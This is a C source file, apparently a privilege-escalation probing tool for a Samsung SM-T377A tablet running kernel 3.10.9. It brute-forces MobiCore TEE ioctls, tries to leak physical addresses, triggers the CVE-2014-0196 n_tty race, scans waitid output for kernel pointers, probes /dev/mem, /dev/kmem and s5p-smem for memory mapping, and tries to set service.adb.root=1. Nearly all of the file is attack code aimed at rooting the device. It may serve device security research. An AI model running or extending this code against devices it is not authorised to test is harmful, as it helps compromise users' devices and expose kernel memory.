/*
 * multi_root.c - Multi-vector privilege escalation 
 * Samsung SM-T377A, kernel 3.10.9
 *
 * Tests: MobiCore TEE, n_tty race, waitid leak, /dev/mem
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <termios.h>
#include <sched.h>

/* MobiCore ioctl definitions */
#define MC_IOC_MAGIC 'M'
struct mc_ioctl_info { unsigned int ext_info_id; unsigned int state; unsigned int ext_info; };
struct mc_ioctl_map { unsigned int len; unsigned int handle; unsigned int phys_addr; unsigned int rfu; unsigned int addr; };
struct mc_ioctl_reg_wsm { unsigned int buffer; unsigned int len; unsigned int handle; unsigned int table_phys; };
struct mc_ioctl_init { unsigned int nq_length; unsigned int mcp_offset; unsigned int mcp_length; };

#define MC_IO_VERSION   _IOR(MC_IOC_MAGIC, 2, unsigned int)
#define MC_IO_INFO      _IOWR(MC_IOC_MAGIC, 1, struct mc_ioctl_info)
#define MC_IO_MAP_WSM   _IOWR(MC_IOC_MAGIC, 6, struct mc_ioctl_map)
#define MC_IO_REG_WSM   _IOWR(MC_IOC_MAGIC, 10, struct mc_ioctl_reg_wsm)
#define MC_IO_INIT      _IOWR(MC_IOC_MAGIC, 0, struct mc_ioctl_init)

static int test_mobicore(void) {
    printf("=== Test 1: MobiCore TEE ===\n");
    int fd = open("/dev/mobicore-user", O_RDWR);
    if (fd < 0) { printf("  Cannot open: %s\n", strerror(errno)); return -1; }
    printf("  Opened fd=%d\n", fd);
    
    unsigned int ver = 0;
    int r = ioctl(fd, MC_IO_VERSION, &ver);
    printf("  VERSION: ret=%d ver=0x%x err=%d\n", r, ver, errno);
    
    for (int id = 0; id < 8; id++) {
        struct mc_ioctl_info info = {.ext_info_id = id};
        r = ioctl(fd, MC_IO_INFO, &info);
        if (r == 0) printf("  INFO[%d]: state=0x%x ext=0x%x\n", id, info.state, info.ext_info);
    }
    
    /* Try to register a WSM buffer — might leak physical address */
    void *buf = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (buf != MAP_FAILED) {
        struct mc_ioctl_reg_wsm reg = {
            .buffer = (unsigned int)(unsigned long)buf,
            .len = 4096,
        };
        r = ioctl(fd, MC_IO_REG_WSM, &reg);
        printf("  REG_WSM: ret=%d handle=0x%x table_phys=0x%x err=%d\n",
               r, reg.handle, reg.table_phys, errno);
        if (r == 0 && reg.table_phys != 0)
            printf("  *** Physical addr leak: 0x%x ***\n", reg.table_phys);
        munmap(buf, 4096);
    }
    
    /* Brute-force ioctl numbers 0-20 with varying direction bits */
    printf("  Scanning ioctls...\n");
    unsigned char iobuf[256];
    for (int nr = 0; nr <= 20; nr++) {
        memset(iobuf, 0, sizeof(iobuf));
        unsigned int cmd = _IOWR(MC_IOC_MAGIC, nr, iobuf);
        r = ioctl(fd, cmd, iobuf);
        if (r == 0) {
            printf("  ioctl(nr=%d,IOWR): OK first=%02x%02x%02x%02x\n",
                   nr, iobuf[0], iobuf[1], iobuf[2], iobuf[3]);
        }
    }
    
    close(fd);
    return 0;
}

/* n_tty race */
static volatile int race_stop = 0;
static int g_slave_fd = -1;

static void *tty_writer(void *arg) {
    int id = (int)(long)arg;
    char buf[4096];
    memset(buf, 'A' + id, sizeof(buf));
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(id & 1, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    while (!race_stop) {
        write(g_slave_fd, buf, sizeof(buf));
        sched_yield();
    }
    return NULL;
}

static int test_ntty_race(void) {
    printf("\n=== Test 2: CVE-2014-0196 n_tty Race ===\n");
    int master = open("/dev/ptmx", O_RDWR | O_NONBLOCK);
    if (master < 0) { printf("  ptmx: %s\n", strerror(errno)); return -1; }
    int unlock = 0; ioctl(master, TIOCSPTLCK, &unlock);
    int sn = -1; ioctl(master, TIOCGPTN, &sn);
    char spath[64]; snprintf(spath, sizeof(spath), "/dev/pts/%d", sn);
    g_slave_fd = open(spath, O_RDWR | O_NONBLOCK);
    if (g_slave_fd < 0) { printf("  slave: %s\n", strerror(errno)); close(master); return -1; }
    
    struct termios t; tcgetattr(g_slave_fd, &t); cfmakeraw(&t); tcsetattr(g_slave_fd, TCSANOW, &t);
    printf("  master=%d slave=%s\n", master, spath);
    
    pid_t pid = fork();
    if (pid == 0) {
        race_stop = 0;
        pthread_t t1, t2;
        pthread_create(&t1, NULL, tty_writer, (void*)0L);
        pthread_create(&t2, NULL, tty_writer, (void*)1L);
        char drain[8192];
        for (int i = 0; i < 30; i++) { usleep(100000); read(master, drain, sizeof(drain)); }
        race_stop = 1;
        pthread_join(t1, NULL); pthread_join(t2, NULL);
        _exit(0);
    }
    int st; waitpid(pid, &st, 0);
    close(g_slave_fd); close(master);
    if (WIFSIGNALED(st)) {
        printf("  *** CRASH sig=%d — VULNERABLE ***\n", WTERMSIG(st));
        return 1;
    }
    printf("  Survived (patched or lucky)\n");
    return 0;
}

/* waitid stack leak */
static int test_waitid_leak(void) {
    printf("\n=== Test 3: waitid Stack Leak ===\n");
    pid_t p = fork();
    if (p == 0) _exit(42);
    
    siginfo_t info;
    memset(&info, 0xAA, sizeof(info));
    waitid(P_PID, p, &info, WEXITED);
    
    unsigned char *raw = (unsigned char *)&info;
    int leaked = 0;
    for (int i = 0; i + 3 < (int)sizeof(info); i++) {
        unsigned int val = *(unsigned int *)(raw + i);
        if ((val & 0xF0000000) == 0xC0000000 && val != 0xCCCCCCCC) {
            printf("  *** Kernel ptr at offset %d: 0x%08x ***\n", i, val);
            leaked = 1;
        }
    }
    if (!leaked) printf("  Clean\n");
    return leaked;
}

/* /dev/mem and /dev/kmem */
static int test_dev_access(void) {
    printf("\n=== Test 4: Direct Memory Access ===\n");
    
    const char *devs[] = {"/dev/mem", "/dev/kmem", "/dev/port", NULL};
    for (int i = 0; devs[i]; i++) {
        int fd = open(devs[i], O_RDONLY);
        if (fd >= 0) {
            printf("  *** %s READABLE ***\n", devs[i]);
            close(fd);
            return 1;
        }
        printf("  %s: %s\n", devs[i], strerror(errno));
    }
    
    /* Try sysfs physical memory access */
    int fd = open("/sys/firmware/memmap", O_RDONLY);
    if (fd >= 0) { printf("  /sys/firmware/memmap readable\n"); close(fd); }
    
    return 0;
}

/* Samsung s5p-smem (shared memory) check */
static int test_s5p_smem(void) {
    printf("\n=== Test 5: Samsung s5p-smem ===\n");
    int fd = open("/dev/s5p-smem", O_RDWR);
    if (fd < 0) {
        printf("  Cannot open: %s\n", strerror(errno));
        /* Try read-only */
        fd = open("/dev/s5p-smem", O_RDONLY);
        if (fd < 0) return -1;
        printf("  Opened read-only\n");
    } else {
        printf("  Opened read-write!\n");
    }
    
    /* Try mmap — s5p-smem might map physical memory */
    void *m = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);
    if (m != MAP_FAILED) {
        printf("  *** mmap succeeded at %p ***\n", m);
        printf("  First 16 bytes: ");
        unsigned char *p = (unsigned char *)m;
        for (int i = 0; i < 16; i++) printf("%02x ", p[i]);
        printf("\n");
        munmap(m, 4096);
    } else {
        printf("  mmap: %s\n", strerror(errno));
    }
    
    /* Try various ioctls */
    for (int nr = 0; nr < 16; nr++) {
        unsigned long arg = 0;
        int r = ioctl(fd, _IOR('S', nr, unsigned long), &arg);
        if (r == 0) printf("  ioctl('S',%d): ret=0 arg=0x%lx\n", nr, arg);
    }
    
    close(fd);
    return 0;
}

/* Check for adbd restart as root trick */
static int test_adbd_root(void) {
    printf("\n=== Test 6: adbd Root Checks ===\n");
    
    /* Check system properties */
    char cmd[256];
    FILE *f;
    
    const char *props[] = {
        "ro.debuggable", "ro.secure", "ro.adb.secure",
        "service.adb.root", "persist.sys.usb.config",
        "ro.build.type", "ro.build.tags"
    };
    
    for (int i = 0; i < 7; i++) {
        snprintf(cmd, sizeof(cmd), "getprop %s", props[i]);
        f = popen(cmd, "r");
        if (f) {
            char val[128] = {0};
            fgets(val, sizeof(val), f);
            val[strcspn(val, "\n")] = 0;
            printf("  %s = %s\n", props[i], val[0] ? val : "(empty)");
            pclose(f);
        }
    }
    
    /* Check if we can set properties */
    printf("  Trying to set service.adb.root=1...\n");
    int r = system("setprop service.adb.root 1 2>/dev/null");
    f = popen("getprop service.adb.root", "r");
    if (f) {
        char val[32] = {0};
        fgets(val, sizeof(val), f);
        val[strcspn(val, "\n")] = 0;
        printf("  service.adb.root = %s (after set attempt)\n", val);
        pclose(f);
    }
    
    return 0;
}

int main(void) {
    printf("=== multi_root: Multi-vector Privesc ===\n");
    printf("UID=%d\n\n", getuid());
    
    test_mobicore();
    test_ntty_race();
    test_waitid_leak();
    test_dev_access();
    test_s5p_smem();
    test_adbd_root();
    
    printf("\n=== Done ===\n");
    return 0;
}
